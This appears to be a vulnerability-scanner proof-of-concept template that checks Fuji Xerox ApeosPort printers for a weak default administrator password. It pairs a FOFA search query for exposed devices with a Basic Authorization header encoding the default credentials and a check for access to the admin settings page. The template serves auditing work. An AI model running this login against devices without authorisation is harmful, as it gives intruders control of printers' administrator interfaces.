id: poc-yaml-fuji-xerox-apeosport-weak-password
info:
  name: 富士施乐 ApeosPort 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: apeosport-v_c3375
  fofa: body="prop.htm" && body="docucentre"
requests:
- method: GET
  path: /prop.htm
  expression: status_code == 401
- method: GET
  path: /prop.htm
  headers:
    Authorization: Basic MTExMTE6eC1hZG1pbg==
  expression: status_code == 200 && contains(body,"Configuration Overview") && contains(body,"Description")
    && contains(body,"System Administrator Settings")
variables: {}
transport: http
